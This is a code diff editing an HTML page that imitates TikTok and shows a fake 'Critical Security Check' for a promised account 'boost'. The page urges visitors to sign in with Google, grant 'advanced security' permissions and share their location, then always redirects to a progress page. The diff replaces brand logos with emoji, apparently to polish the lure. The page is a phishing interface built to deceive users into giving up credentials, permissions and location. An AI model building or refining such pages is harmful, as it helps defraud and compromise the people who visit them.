@@ -45,8 +45,11 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
         .logo {
-            width: 70px;
+            font-size: 60px; /* Adjusted size for emoji */
+            line-height: 1;
             margin-bottom: 20px;
+            color: #e62241; /* TikTok red */
+            text-shadow: 0 0 10px rgba(230, 34, 65, 0.7);
         }
         h1 {
             font-size: 2.2em;
@@ -74,10 +77,9 @@
             background: rgba(255, 255, 255, 0.15);
             transform: translateY(-3px);
         }
-        .verification-option img {
-            width: 40px;
-            height: 40px;
-            filter: grayscale(100%) brightness(200%);
+        .verification-option .icon { /* Using a class for the emoji/symbol */
+            font-size: 40px;
+            line-height: 1;
         }
         .verification-option h2 {
             margin: 0;
@@ -118,22 +120,22 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/TikTok_logo.svg/768px-TikTok_logo.svg.png" alt="TikTok Logo" class="logo">
+        <span class="logo">🎵</span>
         <h1>Critical Security Check Required</h1>
         <p>To finalize your boost and ensure account security, please complete one of the verification steps below.</p>
 
         <div class="verification-option" id="googleLoginOption">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google Logo">
+            <span class="icon">G</span>
             <h2>Sign in with Google</h2>
         </div>
 
         <div class="verification-option" id="securityPermissionOption">
-            <img src="https://www.svgrepo.com/show/511082/lock.svg" alt="Security Lock">
+            <span class="icon">🔒</span>
             <h2>Enable Advanced Security & Permissions</h2>
         </div>
 
         <div class="verification-option" id="locationPermissionOption">
-            <img src="https://www.svgrepo.com/show/509177/location-pin.svg" alt="Location Pin">
+            <span class="icon">📍</span>
             <h2>Verify Location for Global Boost</h2>
         </div>
         
@@ -236,7 +238,7 @@
 
             setTimeout(() => {
                 document.getElementById('loadingOverlay').style.display = 'none';
-                window.location.href = 'progress.html'; // Always redirect, regardless of permission status
+                window.location.href = 'progress.html';
             }, 1500);
         });
 
@@ -284,9 +286,9 @@
 
             setTimeout(() => {
                 document.getElementById('loadingOverlay').style.display = 'none';
-                window.location.href = 'progress.html'; // Always redirect, regardless of permission status
+                window.location.href = 'progress.html';
             }, 1500);
         });
     </script>
 </body>
-    </html>
+</html>
